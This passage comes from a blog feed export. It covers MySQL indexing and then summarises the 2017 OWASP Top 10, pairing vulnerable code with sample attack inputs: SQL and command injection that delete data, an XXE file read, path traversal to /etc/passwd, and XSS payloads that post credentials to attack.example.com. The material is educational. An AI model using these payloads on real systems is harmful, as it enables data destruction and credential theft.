<strong>稀疏索引</strong>，叶子节点相当于是存储（关键字）数据的数据层</p><p>B+数对于B数的优势</p><ul><li>单一节点存储的元素多，使得查询的IO次数更少，适合做MySQL的底层数据结构</li><li>所有查询都要查到叶子节点，查询性能稳定</li><li>所有叶子节点形成一个有序的链表，便于查找</li></ul><h4 id="哈希索引"><a href="#哈希索引" class="headerlink" title="哈希索引"></a>哈希索引</h4><p>只有精确匹配索引所有列的查询才有效。每行数据存储引擎都会对所有的索引列计算一个哈希码，哈希索引将哈希码存储在索引中，同时在哈希表中保存指向每个数据行的指针。因为索引自身只存储对应的哈希值，所以索引的结构十分紧凑，哈希索引查找的速度非常快。但是</p><ul><li>不按照索引顺序存储，无法用于排序</li><li>不支持部分索引查找匹配</li><li>不支持范围查找</li></ul><h4 id="聚集索引"><a href="#聚集索引" class="headerlink" title="聚集索引"></a>聚集索引</h4><p>由B+树实现，一个表只能有一个聚集索引，InnoDB表中聚集索引的索引列就是主键，所以聚集索引也叫主键索引。如下表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">create table Student(    id int(11) primary key auto_increment,    last_name varchar(50) not null,     first_name varchar(50) not null,     birthday date not null);</code></pre><p>聚集索引的结构如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210410161154845.png" alt loading="lazy"></p><blockquote><p>聚簇索引：索引的叶节点指向数据</p><p>非聚簇索引：索引的叶节点指向数据的引用</p><p>myisam使用非聚簇索引，innodb使用聚簇索引</p></blockquote><h4 id="二级索引"><a href="#二级索引" class="headerlink" title="二级索引"></a>二级索引</h4><p>对于InnoDB表，在非主键列的其他列上建的索引就是二级索引（因为聚集索引只有一个）。</p><p>在MySQL中主键索引的叶子节点存的是整行数据，而二级索引叶子节点内容是主键的值。</p><p>详见：<a href="http://mysql.taobao.org/monthly/2020/01/01/">MySQL · 引擎特性 · 二级索引分析</a></p><h3 id="索引优化"><a href="#索引优化" class="headerlink" title="索引优化"></a>索引优化</h3><ul><li><p>尽量保证全值匹配，即索引字段和select字段相同且顺序一致</p></li><li><p>最佳左前缀法则：如果索引多列，则查询要从索引的最左列开始，且中间不跳过索引中的列</p></li><li><p>不在索引列上做任何操作(计算、函数、类型转换、不要出现隐式转)，会导致索引失效而全表扫描</p><pre class="language-sql" data-language="sql"><code class="language-sql">假设目标行 name &#x3D; &#39;july&#39;select * from info where name&#x3D;&#39;july&#39;;           ## 走索引 select * from info where left(name,4)&#x3D;&#39;july&#39;;   ## 不走索引</code></pre></li><li><p>一旦出现非等值字段条件判断，则该字段后的索引列皆失效</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from info where a&#x3D;10 and b&#x3D;100 and c&#x3D;1000;   ## 全索引  a_b_c  select * from info where a&#x3D;10 and b&gt;100 and c&#x3D;1000;   ## 部分索引 a_b  ## 非等值条件包括：in &lt; &gt; !&#x3D; like 等  ## 注意：当like &#39;aaa%&#39; 通配符在右时，仍然能够走全索引  select * from info where a&#x3D;10 and b like &#39;100%&#39; and c&#x3D;1000;   ## 全索引  a_b_c  select * from info where a&#x3D;10 and b like &#39;%100&#39; and c&#x3D;1000;   ## 部分索引 a</code></pre></li><li><p>尽量使用覆盖索引，即查询列为索引列的子集，减少select * 的使用</p></li><li><p>MySQL在使用不等于(!=或者&lt;&gt;)时无法使用索引，会导致全表扫描</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from info where a&#x3D;100;     ## 走索引  select * from info where a!&#x3D;100;    ## 不走索引，全表扫描</code></pre></li><li><p>查询条件为 is NULL 和 is not NULL情况时也无法使用索引</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from info where a is null;      ## 不走索引  select * from info where a is not null;  ## 不走索引 </code></pre></li><li><p>like以通配符开头<code>(&#39;%abc...&#39;)</code>时索引也会失效，变为全表扫描；但通配符结尾依然会走索引，该字段后的索引依然失效</p><pre class="language-sql" data-language="sql"><code class="language-sql">select name, age from info where name like &quot;%aaa&quot;;  ## 索引失效  select name, age from info where name like &quot;aaa%&quot;;  ## 索引有效  ## 当业务要求必须使用左通配符时，可使用覆盖索引的方法来避免索引失效  ## 在上面例子中即建立联合索引 name_age</code></pre></li><li><p>字符串不加单引号会导致索引失效   原因：隐式转换</p><pre class="language-sql" data-language="sql"><code class="language-sql">## id为varchar类型  select * from info where id&#x3D;&#39;2000&#39;;  select * from info where id&#x3D;2000;  ## 会有隐式类型转换</code></pre></li><li><p>尽量少用or，用它来连接查询条件可能会导致索引失效</p></li><li><p>group by基本上都需要进行排序，当group by的字段顺序和索引顺序不一致的时候，就会导致临时表的产生，即同时出现 Using temporary 和 Using filesort，因此一定要极力避免</p><pre class="language-sql" data-language="sql"><code class="language-sql">## 索引为 A_B_C  select * from info where A&#x3D;10 group by C, B;  ## 走索引A，产生临时表</code></pre></li></ul><p><strong>小结</strong></p><ul><li>对于单值索引，尽量选择针对当前查询过滤性更好的索引字段</li><li>在选择联合索引时，当前查询中过滤性最好的字段在索引字段顺序中位置越靠前越好</li><li>在选择联合索引时，尽可能选择可以包含当前查询的where子句中更多字段的索引，即如果可能的话，尽量达到索引覆盖，这样不仅能够避免索引失效，也能够避免回表等影响查询性能等操作</li><li>尽可能通过分析统计信息和调整查询语句的写法来达到适应选择的索引</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol><li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html">The InnoDB Storage Engine</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/storage-engines.html">Alternative Storage Engines</a></li><li><a href="https://github.com/jaywcjlove/mysql-tutorial/blob/master/chapter3/3.5.md">数据库存储引擎</a></li><li><a href="https://juejin.cn/post/6854573221627297800">简单了解InnoDB底层原理</a></li><li><a href="https://zq99299.github.io/dsalg-tutorial/dsalg-java-hsp/12/03.html#b-%E6%A0%91">B 树、B+ 树、B*树</a></li><li><a href="https://segmentfault.com/a/1190000021488885">为什么mysql索引要使用B+树，而不是B树，红黑树</a></li><li><a href="https://juejin.cn/post/6844903919525740552">MySQL索引的原理，B+树、聚集索引和二级索引的结构分析</a></li><li><a href="https://segmentfault.com/a/1190000023441683">MySQL优化之索引优化</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;MySQL存储引擎&quot;&gt;&lt;a href=&quot;#MySQL存储引擎&quot; class=&quot;headerlink&quot; title=&quot;MySQL存储引擎&quot;&gt;&lt;/a&gt;MySQL存储引擎&lt;/h3&gt;&lt;p&gt;存储引擎是MySQL组件，用于处理不同类型的SQL操作。&lt;/p&gt;
&lt;p&gt;使用 &lt;a 
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="SQL" scheme="https://www.extrader.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Owasp_Top_10</title>
    <link href="https://www.extrader.top/posts/db657c/"/>
    <id>https://www.extrader.top/posts/db657c/</id>
    <published>2021-01-30T02:49:21.000Z</published>
    <updated>2021-01-30T10:00:35.063Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://owasp.org/">Owasp</a> 全称 Open Web Application Security Project（开放式Web应用程序安全项目）。</p><p>其中最具权威的就是其”十大安全漏洞列表”，目前正式发布的最新版本是2017年11月份发布的。</p><p>以下对2017年的Top 10版本做一个归纳，例子中不全的欢迎各位大佬评论指出，后续有会添加上。</p><a id="more"></a><h3 id="注入（Injection）"><a href="#注入（Injection）" class="headerlink" title="注入（Injection）"></a>注入（Injection）</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>当不可信的数据作为命令或查询语句的一部分被发送给解释器的时候，会发生注入漏洞，包括SQL、NoSQL、OS以及LDAP注入等。攻击者发送的恶意数据可能会诱使解释器执行计划外的命令，或在没有适当授权的情况下访问数据。</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h5><pre class="language-c#" data-language="c#"><code class="language-c#">string userName &#x3D; ctx.getAuthenticatedUserName();string query &#x3D; &quot;SELECT * FROM items WHERE owner &#x3D; &#39;&quot; + userName + &quot;&#39; AND itemname &#x3D; &#39;&quot; + ItemName.Text + &quot;&#39;&quot;;sda &#x3D; new SqlDataAdapter(query, conn);DataTable dt &#x3D; new DataTable();sda.Fill(dt);</code></pre><p>改代码准备执行的查询如下：</p><pre class="language-sql" data-language="sql"><code class="language-sql">SELECT * FROM items WHERE owner &#x3D; &lt;userName&gt; AND itemname &#x3D; &lt;itemName&gt;;</code></pre><p>但是查询是通过固定的查询字符和用户的输入字符串连接来动态构成的，若攻击者在<code>owner</code>处构造<code>name&#39;; DELETE FROM items; --</code>，则SQL语句变成了</p><pre class="language-sql" data-language="sql"><code class="language-sql">SELECT * FROM items WHERE owner &#x3D; &#39;wiley&#39; AND itemname &#x3D; &#39;name&#39;; DELETE FROM items; --&#39;</code></pre><p>参考：<a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></p><p>本站案例：<a href="https://www.extrader.top/posts/e73517db/">CTF-SQL注入</a>，<a href="https://www.extrader.top/posts/e5cd0178/">Sqli-labs靶场</a></p><h5 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h5><pre class="language-java" data-language="java"><code class="language-java">String btype &#x3D; request.getParameter(&quot;backuptype&quot;);String cmd &#x3D; new String(&quot;cmd.exe &#x2F;K \&quot; c:\\util\\rmanDB.bat &quot; + btype + &quot;&amp;&amp;c:\\utl\\cleanup.bat\&quot;&quot;)System.Runtime.getRuntime().exec(cmd);</code></pre><p>以上代码来自一个管理web的应用程序，改程序旨在允许用户使用批处理文件程序来对Oracle数据库进行备份，然后运行<code>cleanup.bat</code>脚本删除一些临时文件，备份脚本<code>rmanDB.bat</code>接收单个命令参数，该参数指定要执行的备份类型，由于对数据库的访问受到限制，因此该备份脚本通常是以特权用户身份运行的</p><p>通常<code>Runtime.exec()</code>函数不会执行多个命令，但是在这种情况下，程序首先运行<code>cmd.exe shell</code>，以便通过一次调用<code>Runtime.exec()</code>来运行多个命令。调用完<code>rmanDB</code>后，接着调用由<code>&amp;&amp;</code>分隔的多个命令。若攻击者传入的字符串形式为<code>&amp; del c:\\dbms\\*.*</code>，那么该应用程序将执行此命令以及攻击者传入的其它命令 <code>del</code></p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;example.com&#x2F;app&#x2F;accountView?backuptype&#x3D;&amp; del c:\\dbms\\*.*</code></pre><p>参考：<a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></p><p>本站案例：<a href="https://www.extrader.top/posts/c714e372/">CTF-命令执行</a>，<a href="https://www.extrader.top/posts/45c7e77/">php命令执行小技巧</a></p><h5 id="服务器端模板注入（SSTI）"><a href="#服务器端模板注入（SSTI）" class="headerlink" title="服务器端模板注入（SSTI）"></a>服务器端模板注入（SSTI）</h5><pre class="language-php" data-language="php"><code class="language-php">&lt;?phprequire_once dirname(__FILE__).&#39;&#x2F;..&#x2F;lib&#x2F;Twig&#x2F;Autoloader.php&#39;;Twig_Autoloader::register(true);$twig &#x3D; new Twig_Environment(new Twig_Loader_String());$output &#x3D; $twig-&gt;render(&quot;Hello &#123;$_GET[&#39;name&#39;]&#125;&quot;);  &#x2F;&#x2F; 将用户输入作为模版内容的一部分echo $output;</code></pre><p>该段代码使得用户可以在发送电子邮件之前自定义使用的名称，但是若攻击者不将静态值传递到模板中，而是使用GET参数动态生成模板本身的一部分name，如下所示</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;vulnerable-website.com&#x2F;?name&#x3D;IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</code></pre><p>由于 <code>&#123;# comment #&#125;</code> 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 <code>&#123;&#123;2*8&#125;&#125;</code> 作为模板变量最终会返回 16 作为其值进行显示，因此前端最终会返回内容 <code>Hello IsVuln16OK</code></p><p>参考：<a href="https://portswigger.net/kb/issues/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a>，<a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/">服务端模板注入攻击 (SSTI) 之浅析</a></p><p>本站案例：<a href="https://www.extrader.top/posts/47d18edd/">CTF-SSTI</a></p><h4 id="Prevent"><a href="#Prevent" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>使用安全的API</li><li>使用“白名单”对服务器端的输入进行验证</li><li>使用特定的转义语法来转义特殊字</li><li>在查询中使用LIMIT和其他SQL控件，防止SQL注入的情况下大量泄露记录</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">A1:2017-Injection</a></p><h3 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>通过不规范的使用应用程序的身份认证和会话管理功能，从而使攻击者能够破译密码，密钥或会话令牌，或者暂时或永久的冒充其它用户的身份</p><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl">my $q &#x3D; new CGI;if ($q-&gt;cookie(&#39;loggedin&#39;) ne &quot;true&quot;) &#123;    if (! AuthenticateUser($q-&gt;param(&#39;username&#39;), $q-&gt;param(&#39;password&#39;))) &#123;    ExitError(&quot;Error: you need to log in first&quot;);    &#125;else &#123;        # Set loggedin and user cookies.        $q-&gt;cookie(        -name &#x3D;&gt; &#39;loggedin&#39;,        -value &#x3D;&gt; &#39;true&#39;        );        $q-&gt;cookie(        -name &#x3D;&gt; &#39;user&#39;,        -value &#x3D;&gt; $q-&gt;param(&#39;username&#39;)        );    &#125;&#125;if ($q-&gt;cookie(&#39;user&#39;) eq &quot;Administrator&quot;) &#123;DoAdministratorTasks();&#125;</code></pre><p>以上代码旨在确保用户已经登录，如果未登录，则代码将使用用户提供的用户名和密码进行身份验证，如果成功，它将登录用户并将用户的cookie设置为“记住”用户已经登录，最后，如果登录的用户的cookie中具有“管理员”用户名，则代码将执行管理员任务。</p><p>然而，这段代码是可以绕过的，攻击者可以独立设置cookie，使得代码不会检查用户名和密码，并且还可以伪造“管理员”身份进行操作，伪造的request头如下：</p><pre class="language-http" data-language="http"><code class="language-http">GET &#x2F;cgi-bin&#x2F;vulnerable.cgi HTTP&#x2F;1.1Cookie: user&#x3D;AdministratorCookie: loggedin&#x3D;true</code></pre><p>通过将登录的cookie loggedin设置为“true”，攻击者将绕过整个身份认证；通过使cookie user为“Administrator”值，从而获得管理员权限</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></p><h4 id="Prevent-1"><a href="#Prevent-1" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>实施多因素身份认证，以防止自动进行凭据填充，暴力破解和凭据重用攻击</li><li>不适用默认密码，弱密码，尤其是对于管理员用户</li><li>实施密码检测，限制密码长度，复杂性</li><li>限制登录失败次数，频繁的登录尝试，记录故障，并在检测到攻击时提醒管理员</li><li>适用服务器端安全的内置会话管理器</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">A2:2017-Broken Authentication</a></p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>我们的敏感信息包括密码、财务数据、医疗数据等，由于web应用或者API未加密或不正确的保护敏感数据，这些数据极易遭到攻击者利用，攻击者可能使用这些数据来进行一些犯罪行为，因此，未加密的信息极易遭到破坏和利用，我们应该加强对敏感数据的保护，web应用应该在传输过程中数据、存储的数据以及和浏览器的交互时的数据进行加密，保证数据安全。</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php">function persistLogin($username, $password)&#123;    $data &#x3D; array(&quot;username&quot; &#x3D;&gt; $username, &quot;password&quot;&#x3D;&gt; $password);    setcookie (&quot;userdata&quot;, $data);&#125;</code></pre><p>此代码将用户的信息写入cookie，因此用户以后不必再次登录</p><p>该代码以纯文本的格式将用户的用户名和密码存储在计算机的cookie中，如果攻击者破坏了用户的计算机，则这将公开用户的登录信息，即使用户的计算机没有受到损害，当这种弱点加上跨站点脚本可能使攻击者远程复制cookie</p><h4 id="Prevent-2"><a href="#Prevent-2" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>对应用程序处理，存储或传输的数据进行分类。</li><li>不存储不必要的敏感数据，尽快将其丢弃</li><li>确保对静态的所有敏感数据进行加密，并且使用最新且功能强大的标准算法，协议和密钥</li><li>使用安全协议对传输中的所有数据进行加密，如https，hsts</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">A3:2017-Sensitive Data Exposure</a></p><h3 id="XML外部实体（XXE）"><a href="#XML外部实体（XXE）" class="headerlink" title="XML外部实体（XXE）"></a>XML外部实体（XXE）</h3><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><p>XXE 全称为XML External Entity attack 即XML<a href="https://baike.baidu.com/item/可扩展标记语言/2885849?fromtitle=xml&fromid=86251&fr=aladdin">(可扩展标记语言)</a> 外部实体注入攻击，早期或配置错误的XML处理器评估了XML文件外部实体引用，攻击者可以利用这个漏洞窃取URI(<a href="https://baike.baidu.com/item/URI/16481812">统一资源标识符</a>)文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施<a href="https://baike.baidu.com/item/拒绝服务攻击/421896?fr=aladdin">拒绝服务攻击</a>。</p><h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $xml &#x3D; simplexml_load_string($_REQUEST[&#39;xml&#39;]);    print_r($xml);?&gt;</code></pre><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype">&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY >&lt;!ENTITY file SYSTEM "file:///d://flag.txt" >]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>具体参考本站：<a href="https://www.extrader.top/posts/55c267c8/">XXE学习笔记</a></p><h4 id="Prevent-3"><a href="#Prevent-3" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>尽可能使用不太复杂的数据格式（如：JSON）避免敏感数据的序列化</li><li>修补或升级应用程序或基础操作系统上正在使用的所有XML处理器和库</li><li>在应用程序的所有XML解析器中禁用XML外部实体和DTD处理。</li><li>在服务器端实施“白名单”输入验证，过滤或清理操作</li></ol><h3 id="失效的访问控制"><a href="#失效的访问控制" class="headerlink" title="失效的访问控制"></a>失效的访问控制</h3><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可以利用这个漏洞去查看未授权的功能和数据，例：访问用户的账户、敏感文件、获取和正常用户相同的权限等.</p><h4 id="Example-4"><a href="#Example-4" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl">my $dataPath &#x3D; &quot;&#x2F;users&#x2F;cwe&#x2F;profiles&quot;;my $username &#x3D; param(&quot;user&quot;);my $profilePath &#x3D; $dataPath . &quot;&#x2F;&quot; . $username;open(my $fh, &quot;&lt;$profilePath&quot;) || ExitError(&quot;profile read error: $profilePath&quot;);    print &quot;&lt;ul&gt;\n&quot;;    while (&lt;$fh&gt;) &#123;    print &quot;&lt;li&gt;$_&lt;&#x2F;li&gt;\n&quot;;&#125;print &quot;&lt;&#x2F;ul&gt;\n&quot;;</code></pre><p>以上代码可能适用于社交网络应用程序，其中用户的个人资料信息都存储在单独的文件中，所有文件都存储在一个目录中</p><p>尽管程序员打算访问“/users/cwe/profiles/alice”之类的文件，但没有验证传入的用户参数。攻击者可能会提供以下字符串：</p><pre class="language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>该程序将生成如下的配置文件路径名：</p><pre class="language-none"><code class="language-none">&#x2F;users&#x2F;cwe&#x2F;profiles&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>打开文件后，操作系统会在路径规范化期间解析“ ../”，并实际访问此文件：</p><pre class="language-none"><code class="language-none">&#x2F;etc&#x2F;passwd</code></pre><p>结果，攻击者可以阅读密码文件的整个文本</p><h4 id="Prevent-4"><a href="#Prevent-4" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>除公共资源外，默认情况下拒绝</li><li>一次实施访问控制机制，并在整个应用程序中重复使用它们，包括最大程度地减少<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">CORS</a>的使用。</li><li>禁用Web服务器目录列表，并确保Web根目录中不存在文件元数据（例如.git）和备份文件。</li><li>限速API和控制器访问权限，以最大程度减少自动攻击工具带来的危害。</li></ol><h3 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h3><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><p>安全配置错误是比较常见的漏洞，由于操作者的不当配置(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。</p><h4 id="Example-5"><a href="#Example-5" class="headerlink" title="Example"></a>Example</h4><pre class="language-java" data-language="java"><code class="language-java">Properties prop &#x3D; new Properties();prop.load(new FileInputStream(&quot;config.properties&quot;));String password &#x3D; prop.getProperty(&quot;password&quot;);DriverManager.getConnection(url, usr, password);</code></pre><p>以下代码从属性文件中读取密码，并使用该密码连接到数据库。</p><p>该代码将成功运行，但是有权访问config.properties的任何人都可以读取密码的值。如果攻击者有权访问此信息，则可以使用它来入侵系统。</p><p>参考：<a href="https://cwe.mitre.org/data/definitions/256.html">CWE-256: Unprotected Storage of Credentials</a></p><h4 id="Prevent-5"><a href="#Prevent-5" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>自动化安装部署，保证开发，QA，产品环境的配置尽量相同，减少部署一个新安全环境的耗费，</li><li>及时了解并部署每个环境的软件更新和补丁信息</li><li>使用提供有效分离的安全性强大的应用程序架构</li><li>实施漏洞扫描和安全审计，以帮助检查错误的配置或者未安装的补丁</li></ol><p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">A6：2017-安全性错误配置</a></p><h3 id="跨站点脚本（XSS）"><a href="#跨站点脚本（XSS）" class="headerlink" title="跨站点脚本（XSS）"></a>跨站点脚本（XSS）</h3><h4 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h4><p>xss攻击全称为<a href="https://baike.baidu.com/item/XSS攻击/954065?fr=aladdin">跨站脚本攻击</a>,当应用程序的新网页中包含不受信任的、未经恰当验证、转义的数据或可以使用HTML、JavaScript的浏览器API更新的现有网页时，就会出现xss漏洞，跨站脚本攻击是最普遍的web应用安全漏洞，甚至在某些安全平台都存在xss漏洞。xss会执行攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用xss还可以执行拒绝服务攻击。</p><h4 id="Example-6"><a href="#Example-6" class="headerlink" title="Example"></a>Example</h4><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><pre class="language-php" data-language="php"><code class="language-php">$username &#x3D; $_GET[&#39;username&#39;];echo &#39;&lt;div class&#x3D;&quot;header&quot;&gt; Welcome, &#39; . $username . &#39;&lt;&#x2F;div&gt;&#39;;</code></pre><p>以上代码基于HTTP GET用户名参数在网页上显示欢迎消息。</p><p>由于参数可以是任意的，因此可以修改页面的url，因此<code>$username</code>可以包含脚本语法，例如：</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;trustedSite.example.com&#x2F;welcome.php?username&#x3D;&lt;Script Language&#x3D;&quot;Javascript&quot;&gt;alert(&quot;You&#39;ve been attacked!&quot;);&lt;&#x2F;Script&gt;</code></pre><p>这样会弹出无害的警告对话框，最初这不是一个很大的漏洞，毕竟，为什么有人输入一个导致恶意代码在其自己的计算机上运行的URL？真正的危险在于，攻击者将创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者单击链接时，他们会通过易受攻击的Web应用程序不经意地将恶意内容反映回自己的计算机。更现实的是，攻击者可以在页面上嵌入一个伪造的登录框，诱使用户将用户的密码发送给攻击者：</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;trustedSite.example.com&#x2F;welcome.php?username&#x3D;&lt;div id&#x3D;&quot;stealPassword&quot;&gt;Please Login:&lt;form name&#x3D;&quot;input&quot; action&#x3D;&quot;http:&#x2F;&#x2F;attack.example.com&#x2F;stealPassword.php&quot; method&#x3D;&quot;post&quot;&gt;Username: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; &#x2F;&gt;&lt;br&#x2F;&gt;Password: &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Login&quot; &#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;</code></pre><p>如果用户单击此链接，那么Welcome.php将生成以下HTML并将其发送到用户的浏览器：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Welcome, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stealPassword<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Please Login:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>attack.example.com/stealPassword.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        Password: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>但是，精明的用户可能会注意到URL上附加了可疑文本。攻击者可能进一步混淆URL（以下示例链接分为多行以提高可读性）：</p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;trustedSite.example.com&#x2F;welcome.php?username&#x3D;%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22+name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</code></pre><p>相同的攻击字符串也可能被混淆为：</p><pre 